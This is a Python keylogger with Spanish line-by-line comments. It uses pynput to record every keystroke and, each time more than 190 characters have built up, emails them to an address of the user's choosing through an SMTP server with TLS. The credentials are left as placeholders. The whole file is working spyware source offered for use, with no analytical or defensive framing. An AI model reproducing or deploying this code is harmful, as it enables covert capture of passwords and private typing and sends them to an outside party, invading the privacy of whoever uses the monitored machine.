from pynput.keyboard import Key, Listener  # Importa las funciones necesarias para el keylogger.
from email.message import EmailMessage  # Importa la clase EmailMessage para enviar correos electrónicos.
import smtplib, ssl  # Importa los módulos necesarios para enviar correos electrónicos de forma segura.

keys = ''  # Inicializa una cadena vacía para almacenar las pulsaciones de teclas.

def on_press(key):
    """Función que se ejecuta cada vez que se presiona una tecla."""
    global keys  # Permite modificar la variable 'keys' globalmente.
    keys += str(key)  # Concatena la tecla presionada a la cadena 'keys'.
    print(len(keys), keys)  # Imprime la longitud de la cadena 'keys' y las teclas presionadas.
    if len(keys) > 190:  # Si la longitud de 'keys' supera un límite predefinido...
        send_email(keys)  # ...envía un correo electrónico con las teclas registradas.
        keys = ''  # Reinicia la variable 'keys' para comenzar a registrar nuevas teclas.

def send_email(message):
    """Función para enviar un correo electrónico con las teclas registradas."""
    smtp_server = "CHANGE"  # Cambia esto por tu servidor SMTP.
    port = 587
    sender_email = "CHANGE"  # Cambia esto por tu dirección de correo electrónico.
    password = "CHANGE"  # Cambia esto por tu contraseña de correo electrónico.
    receiver_email = sender_email  # Define el destinatario del correo electrónico como el remitente.
    em = EmailMessage()  # Crea un nuevo objeto EmailMessage.
    em.set_content(message)  # Establece el contenido del correo electrónico como las teclas registradas.
    em['To'] = receiver_email  # Establece el destinatario del correo electrónico.
    em['From'] = sender_email  # Establece el remitente del correo electrónico.
    em['Subject'] = 'keylog'  # Establece el asunto del correo electrónico como 'keylog'.
    context = ssl.create_default_context()  # Crea un contexto SSL por defecto.
    with smtplib.SMTP(smtp_server, port) as s:  # Establece una conexión SMTP.
        s.ehlo()  # Saluda al servidor SMTP.
        s.starttls(context=context)  # Inicia el cifrado TLS.
        s.ehlo()  # Saluda nuevamente después de iniciar TLS.
        s.login(sender_email, password)  # Inicia sesión en el servidor SMTP.
        s.send_message(em)  # Envía el correo electrónico.

with Listener(on_press=on_press) as listener:  # Crea un listener para capturar las pulsaciones de teclas.
    listener.join()  # Espera hasta que el listener termine su ejecución.